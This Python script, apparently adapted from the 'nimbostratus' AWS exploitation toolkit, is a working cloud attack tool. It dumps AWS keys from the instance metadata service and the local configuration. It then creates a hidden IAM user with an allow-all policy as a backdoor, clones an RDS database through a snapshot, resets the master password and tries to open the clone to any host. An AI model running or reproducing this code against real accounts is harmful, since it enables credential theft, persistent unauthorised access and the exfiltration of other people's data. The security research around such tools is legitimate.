#!/usr/bin/env python

import logging
import random
import string
import time

from boto.provider import get_default
from boto.utils import get_instance_metadata
from boto.rds import connect_to_region

from core.utils.mangle import metadata_hook
from core.common_arguments import add_mangle_arguments

from boto.iam import IAMConnection

#root_access_key =''

#root_token = NULL

#root_secret_key = ''


SUCCESS_MESSAGE = '''\
Anyone can connect to this MySQL instance at:
    - Host: %s
    - Port: %s
    
    Using root:
        mysql -u %s -p%s -h %s
'''

SUCCESS = '''\
Created user %s with ALL PRIVILEGES. User information:
    * Access key: %s
    * Secret key: %s
    * Policy name: %s
'''
ALL_POLICY = '''\
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
'''


def cmd_handler():

    logging.debug('Starting dump-credentials')
    print ('Starting dump-credentials')    
    get_credentials()
    #print(' Creating IAM user')
    #create_iam_user(root_access_key, root_secret_key, root_token)    

def create_iam_user(access_key, secret_key, token):
    try:
        conn = IAMConnection(aws_access_key_id=access_key,
                             aws_secret_access_key=secret_key,
                             security_token=token)
    except Exception, e:
        print('Failed to connect to IAM: "%s"' % e.error_message)
        print('Account has no access to IAM')
        return
    
    user_name = ''.join([random.choice(string.ascii_lowercase) for _ in xrange(9)])
    
    print('Trying to create user "%s"' % user_name)
    
    try:
        conn.create_user(user_name)
    except Exception, e:
        print('Failed to create user: "%s"' % e.error_message)
        return
    print('User "%s" created' % user_name)
    print('Trying to create user "%s" access keys' % user_name)
    
    try:
        credentials = conn.create_access_key(user_name=user_name)
    except Exception, e:
        print('Failed to create user access key: "%s"' % e.error_message)
        return
        
    key = credentials['create_access_key_response']['create_access_key_result']['access_key']
    api_key = key['access_key_id']
    api_secret = key['secret_access_key']

    msg = 'Created access keys for user %s. Access key: %s , access secret: %s'
    print(msg % (user_name, api_key, api_secret))
    
    policy_name = 'nimbostratus%s' % user_name
    
    try:
        conn.put_user_policy(user_name, policy_name, ALL_POLICY)
    except Exception, e:
        print('Failed to add user policy: "%s"' % e.error_message)
        return
        
    print(SUCCESS % (user_name, api_key, api_secret, policy_name))

    
def get_credentials():
    print('Get credentials');
    get_metadata_credentials()
    get_local_credentials()
    
def get_metadata_credentials():
    meta_data = get_instance_metadata(data='meta-data/iam/security-credentials',
                                      num_retries=1, timeout=2)
    if not meta_data:
        print('Failed to contact instance meta-data server.')
    else:
        security = meta_data.values()[0]
        access_key = security['AccessKeyId']
        secret_key = security['SecretAccessKey']
        security_token = security['Token']
    
        print_credentials(access_key, secret_key, security_token)

def create_rds_snapshot(access_key, secret_key, token):

    print('*******************************Starting snapshot-rds***************************************')

    password=raw_input("Enter RDS password for expoliting, Note that it does not prompt for old password!!!:")

    region='ap-southeast-1'

    rds_name='nimbostratus'

    print('\n Access Key: %s \nsecret_key: %s, \ntoken: %s' %(access_key, secret_key, token))
    
    try:
        conn = connect_to_region(region,
                                 aws_access_key_id=access_key,
                                 aws_secret_access_key=secret_key,
                                 security_token=token)
    except Exception, e:
        print('Failed to connect to RDS: "%s"' % e.error_message)
        return
    
    try:
        instances = conn.get_all_dbinstances(rds_name)
        db = instances[0]
    except Exception, e:
        print('No RDS instance with name "%s"' % (rds_name,
                                                             e.error_message))
        return
    
    snapshot_name = ''.join([random.choice(string.ascii_lowercase) for _ in xrange(9)])
    security_group_name = ''.join([random.choice(string.ascii_lowercase) for _ in xrange(9)])
    restored_instance = 'restored-%s' % snapshot_name
    
    try:
        db.snapshot(snapshot_name)
        
        print('Waiting for snapshot to complete in AWS... (this takes at least 5m)')
        wait_for_available_db(conn, rds_name)
        
    except Exception, e:
        print('Failed to snapshot: "%s"' % e.error_message)
        return
    
    try:
        db_clone = conn.restore_dbinstance_from_dbsnapshot(snapshot_name,
                                                           restored_instance,
                                                           'db.m1.small')
        
        print('Waiting for restore process in AWS... (this takes at least 5m)')
        wait_for_available_db(conn, restored_instance)
        
    except Exception, e:
        print('Failed to restore DB instance: "%s"' % e.error_message)
        return
    
    try:
        conn.modify_dbinstance(id=restored_instance,
                               master_password=password,
                               apply_immediately=True)
    except Exception, e:
        msg = 'Failed to change the newly created RDS master password: "%s"'
        print(msg % e.error_message)
    
    
    print('Creating a DB security group which allows connections from'
                  ' any location and applying it to the newly created RDS'
                  ' instance.')
    
    try:
        # Very insecure, everyone can connect to this MySQL instance
        sg = conn.create_dbsecurity_group(security_group_name, 'All hosts can connect')
        #sg.authorize(cidr_ip='0.0.0.0/0')
        
        # Just in case we wait for it to be available
        db_clone = wait_for_available_db(conn, restored_instance)
        
        #db_clone.modify(security_groups=[sg])
    except Exception, e:
        print('Failed to create and apply DB security group: "%s"' % e.error_message)
        return
    else:
        host, port = db_clone.endpoint
        print(SUCCESS_MESSAGE % (host, port,
                                        'root', password, host))

def wait_for_available_db(conn, db_name):
    time.sleep(30)
    while True:
        db = conn.get_all_dbinstances(db_name)[0]
        if db.status == 'available' and db.endpoint is not None:
            break
        else:
            logging.debug('Waiting...')
            time.sleep(30)
    
    return db

def get_local_credentials():
    provider = get_default()
    provider.get_credentials()
    
    access_key = provider.get_access_key()
    secret_key = provider.get_secret_key()
    security_token = provider.get_security_token()
    
    root_access_key = access_key
    root_secret_key = secret_key
    root_token = security_token
    print_credentials(access_key, secret_key, security_token)

    print(' Creating IAM user')
    create_iam_user(root_access_key, root_secret_key, root_token)
    create_rds_snapshot(root_access_key, root_secret_key, root_token)


def print_credentials(access_key, secret_key, security_token):
    print('Found credentials')
    print('  Access key: %s' % access_key)
    print('  Secret key: %s' % secret_key)
    if security_token:
        print('  Token: %s' % security_token)
    print('')


if __name__ == '__main__':
    #from core.cmd_handler import cmd_handler
    cmd_handler()
    





